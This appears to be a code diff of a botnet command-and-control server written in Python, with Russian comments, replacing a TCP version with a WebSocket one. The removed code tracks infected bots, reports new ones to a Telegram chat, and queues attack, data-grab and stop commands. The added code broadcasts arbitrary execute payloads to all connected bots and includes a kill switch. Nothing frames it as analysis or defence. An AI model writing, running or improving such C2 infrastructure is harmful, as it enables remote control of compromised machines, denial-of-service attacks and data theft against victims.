@@ -1,168 +1,63 @@
-#!/usr/bin/env python3
-# AVZ-Aristo C2 v29.0 – processing new vectors
-import asyncio, json, os, time, subprocess, requests
-from datetime import datetime
+import asyncio
+import websockets
+import json
+import os
+from utils.logger import log
 
-HTTP_PORT = 80
-BOTS_FILE = "bots.json"
-COMMANDS_FILE = "commands.json"
+connected_bots = {}  # {bot_id: {'ws': websocket, 'info': {}}}
+KILL_SWITCH_TOKEN = os.environ.get('KILL_TOKEN', 'default_kill')
 
-def load_secret(key):
+async def handler(websocket, path):
+    bot_id = None
     try:
-        with open("secrets.json") as f:
-            return json.load(f).get(key, "")
-    except:
-        return ""
-
-TELEGRAM_TOKEN = load_secret("telegram_token")
-TELEGRAM_CHAT_ID = load_secret("telegram_chat_id")
-
-def telegram_notify(msg):
-    if not (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID):
-        return
-    try:
-        subprocess.run([
-            "curl", "-s", "-X", "POST",
-            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-            "-d", f"chat_id={TELEGRAM_CHAT_ID}&text={msg}"
-        ], timeout=5)
-    except:
+        async for message in websocket:
+            data = json.loads(message)
+            cmd = data.get('cmd')
+            
+            if cmd == 'register':
+                bot_id = data['bot_id']
+                connected_bots[bot_id] = {
+                    'ws': websocket,
+                    'info': data.get('info', {}),
+                    'bandwidth_mbps': data.get('bandwidth', 10)
+                }
+                await websocket.send(json.dumps({'status': 'ok'}))
+                log(f'[C2] Bot {bot_id} online')
+                
+            elif cmd == 'heartbeat':
+                if bot_id in connected_bots:
+                    connected_bots[bot_id]['last_seen'] = asyncio.get_event_loop().time()
+                    
+            elif cmd == 'command':
+                # Админская команда рассылается всем
+                if data.get('token') != KILL_SWITCH_TOKEN:
+                    continue
+                broadcast_cmd = data['payload']
+                await broadcast(json.dumps({'cmd': 'execute', 'data': broadcast_cmd}))
+                
+    except websockets.exceptions.ConnectionClosed:
         pass
+    finally:
+        if bot_id:
+            del connected_bots[bot_id]
+            log(f'[C2] Bot {bot_id} offline')
 
-def get_country(ip):
-    try:
-        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=countryCode", timeout=2)
-        if resp.status_code == 200:
-            return resp.json().get("countryCode", "")
-    except:
-        pass
-    return ""
+async def broadcast(message: str):
+    if connected_bots:
+        await asyncio.wait([bot['ws'].send(message) for bot in connected_bots.values()])
 
-bots = {}
-if os.path.exists(BOTS_FILE):
-    with open(BOTS_FILE) as f:
-        bots = json.load(f)
-
-commands_queue = {}
-if os.path.exists(COMMANDS_FILE):
-    with open(COMMANDS_FILE) as f:
-        commands_queue = json.load(f)
-
-def save_bots():
-    with open(BOTS_FILE, "w") as f:
-        json.dump(bots, f, indent=2)
-
-def save_commands():
-    with open(COMMANDS_FILE, "w") as f:
-        json.dump(commands_queue, f, indent=2)
-
-def parse_last_seen(raw):
-    if isinstance(raw, datetime):
-        return raw
-    if isinstance(raw, (int, float)):
-        return datetime.fromtimestamp(raw)
-    try:
-        return datetime.strptime(raw, "%Y-%m-%d %H:%M:%S")
-    except:
-        return datetime.fromtimestamp(0)
-
-async def handle_client(reader, writer):
-    ip = writer.get_extra_info('peername')[0]
-    try:
-        data = await asyncio.wait_for(reader.read(4096), timeout=5)
-    except:
-        writer.close()
-        return
-    msg = data.decode('utf-8', errors='replace').strip()
-    print(f"[TCP:{ip}] {msg[:200]}")
-
-    if msg == "list":
-        now = datetime.now()
-        bots_list = []
-        for bot_ip, bot in bots.items():
-            try:
-                last_seen = parse_last_seen(bot.get("last_seen"))
-                bot["status"] = "online" if (now - last_seen).total_seconds() < 120 else "offline"
-            except:
-                bot["status"] = "offline"
-            bots_list.append(bot)
-        writer.write(json.dumps(bots_list).encode())
-    elif msg.startswith("delete:"):
-        target_ip = msg.split(":")[1]
-        if target_ip in bots:
-            del bots[target_ip]
-            save_bots()
-            writer.write(b"deleted")
-        else:
-            writer.write(b"not found")
-    elif msg.startswith("attack:"):
-        parts = msg.split(":", 1)[1].split("|")
-        if len(parts) >= 3:
-            target, method, threads = parts[0], parts[1], parts[2]
-            bot_ips = parts[3].split(",") if len(parts) > 3 else list(bots.keys())
-            for bot_ip in bot_ips:
-                commands_queue.setdefault(bot_ip, []).append(
-                    {"type": "attack", "target": target, "method": method, "threads": int(threads)})
-            save_commands()
-            writer.write(b"commands queued")
-        else:
-            writer.write(b"invalid format")
-    elif msg.startswith("grab:"):
-        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
-        for bot_ip in bot_ips:
-            commands_queue.setdefault(bot_ip, []).append({"type": "grab"})
-        save_commands()
-        writer.write(b"grab queued")
-    elif msg.startswith("stop:"):
-        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
-        for bot_ip in bot_ips:
-            commands_queue.setdefault(bot_ip, []).append({"type": "stop"})
-        save_commands()
-        writer.write(b"stop queued")
-    elif msg == "ping":
-        if ip in commands_queue and commands_queue[ip]:
-            pending = commands_queue.pop(ip)
-            save_commands()
-            writer.write(json.dumps(pending).encode())
-        else:
-            writer.write(b"no commands")
-        if ip in bots:
-            bots[ip]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            bots[ip]["status"] = "online"
-            save_bots()
-    else:
-        info = {}
-        try:
-            data = json.loads(msg)
-            if isinstance(data, dict) and data.get("type") == "register":
-                info = data.get("data", {})
-            else:
-                info = data
-        except:
-            pass
-        hostname = info.get("hostname", "")
-        os_info = info.get("os", "")
-        cpu = info.get("cpu", "")
-        ram = info.get("ram", "")
-        is_new = ip not in bots
-        country = get_country(ip) if is_new else bots[ip].get("country", "")
-        bots[ip] = {
-            "ip": ip, "hostname": hostname, "os": os_info, "cpu": cpu, "ram": ram,
-            "country": country, "status": "online", "rps": 0,
-            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-        save_bots()
-        if is_new:
-            telegram_notify(f"🟢 Новый бот: {ip} ({hostname}, {os_info})")
-        writer.write(b"registered")
-    await writer.drain()
-    writer.close()
+# Улучшение №8: Kill switch
+async def kill_switch(token: str):
+    if token == KILL_SWITCH_TOKEN:
+        await broadcast(json.dumps({'cmd': 'kill'}))
+        log('[C2] KILL SWITCH ACTIVATED')
+        return True
+    return False
 
 async def main():
-    server = await asyncio.start_server(handle_client, '0.0.0.0', HTTP_PORT)
-    print(f"[+] C2 на порту {HTTP_PORT}")
-    async with server:
-        await server.serve_forever()
+    async with websockets.serve(handler, '0.0.0.0', 8888):
+        log('[C2] WebSocket C2 запущен на порту 8888')
+        await asyncio.Future()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     asyncio.run(main())
